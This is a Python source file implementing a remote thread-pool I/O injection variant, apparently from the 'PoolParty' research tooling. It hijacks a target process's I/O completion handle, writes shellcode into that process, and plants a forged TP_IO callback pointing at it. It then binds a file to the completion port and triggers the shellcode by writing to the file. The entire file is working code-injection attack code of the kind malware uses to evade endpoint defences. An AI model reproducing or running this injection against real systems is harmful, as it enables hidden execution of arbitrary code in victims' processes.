import ctypes

from pool_party import *
from write_shellcode import *


class RemoteTpIoInsertion(PoolParty):
    def __init__(self, process):
        super().__init__(process)
        self.process_handle = HANDLE(0)
        self.handle_io_completion = HANDLE(0)
        self.shellcode_address = 0

    def hijack(self):
        self.handle_io_completion = self.hijack_process_handle(IO_COMPLETION_OBJECT_NAME,
                                                               ULONG(IO_COMPLETION_ALL_ACCESS))
        return True

    def write_shellcode_to_pool(self):
        self.shellcode_address = write_shellcode(self.process_handle)
        return True

    def setup_execute(self):
        file_handle = CreateFileW(POOL_PARTY_FILE_NAME, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None,
                                  CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, None)
        if file_handle is None:
            logging.error("[-] CreateFileW failed with error code %d" % GetLastError())
            return False

        tp_io_ptr = CreateThreadpoolIo(file_handle, self.shellcode_address, None, None)
        if tp_io_ptr is None:
            logging.error("[-] CreateThreadpoolIo failed with error code %d" % GetLastError())
            return False

        tp_io_cleanup_group_member_callback = convert_buffer_to_struct(tp_io_ptr, ctypes.c_uint64, 0x50)
        tp_io_cleanup_group_member_callback.value = self.shellcode_address

        tp_io_pending_irp_count = convert_buffer_to_struct(tp_io_ptr, ctypes.c_uint32, 0x118)
        tp_io_pending_irp_count.value = tp_io_pending_irp_count.value + 1

        remote_tp_io_ptr = VirtualAllocEx(self.process_handle, None, 0x120, MEM_COMMIT | MEM_RESERVE,
                                          PAGE_READWRITE)  # size of FULL_TP_IO
        if remote_tp_io_ptr is None:
            logging.error("[-] VirtualAllocEx for Remote TP IO failed with error code %d" % GetLastError())
            return False

        if not WriteProcessMemory(self.process_handle, remote_tp_io_ptr, tp_io_ptr, 0x120, None):
            logging.error("[-] WriteProcessMemory for Remote TP IO failed with error code %d" % GetLastError())
            return False

        file_io_completion_info = FILE_COMPLETION_INFORMATION()
        file_io_completion_info.port = self.handle_io_completion
        file_io_completion_info.key = ctypes.cast(ctypes.cast(remote_tp_io_ptr, c_void_p).value + 0xc8, LPVOID)

        size_of_io_status_block = 16
        io_status_block = (ctypes.c_ubyte * size_of_io_status_block)()

        nt_status = ZwSetInformationFile(file_handle, ctypes.POINTER(ctypes.c_ubyte)(io_status_block),
                                         ctypes.POINTER(LPVOID)(file_io_completion_info), sizeof(FILE_COMPLETION_INFORMATION), FileReplaceCompletionInformation)
        if nt_status != 0:
            logging.error("[-] ZwSetInformationFile returned error code {:x}".format(nt_status))
            return False

        buffer = ctypes.create_unicode_buffer(POOL_PARTY_POEM)
        buffer_size = len(buffer) * ctypes.sizeof(ctypes.c_wchar)
        bytes_written = DWORD(0)
        overlapped = (ctypes.c_ubyte * 32)()
        if (not WriteFile(file_handle, buffer, buffer_size, POINTER(DWORD)(bytes_written), POINTER(c_ubyte)(overlapped))
                and GetLastError() != 997):  # ERROR_IO_PENDING
            logging.error("[-] WriteFile returned error code %d" % GetLastError())
            return False

        print(bytes_written)